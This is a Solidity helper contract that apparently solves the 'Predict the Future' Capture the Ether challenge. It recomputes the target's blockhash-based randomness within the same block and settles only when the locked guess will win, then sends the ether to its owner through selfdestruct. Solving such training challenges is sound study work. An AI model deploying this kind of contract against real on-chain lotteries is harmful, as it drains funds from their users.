pragma solidity ^0.4.21;

import "../PredictTheFutureChallenge.sol";

contract PredictTheFutureHelper {
    address owner;
    uint8 guess;

    function PredictTheFutureHelper() public {
        owner = msg.sender;
    }

    function lockInGuess(address _lottery, uint8 n) external payable {
        guess = n;
        PredictTheFutureChallenge(_lottery).lockInGuess.value(1 ether)(n);
    }

    function exploit(address _lottery) external payable {
        require(guess == answer(block.number));
        PredictTheFutureChallenge(_lottery).settle();
    }

    function answer(uint256 blockNumber) public view returns (uint8) {
        return uint8(keccak256(block.blockhash(blockNumber - 1), now)) % 10;
    }

    function withdrawAllFunds() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function() external payable {}
}
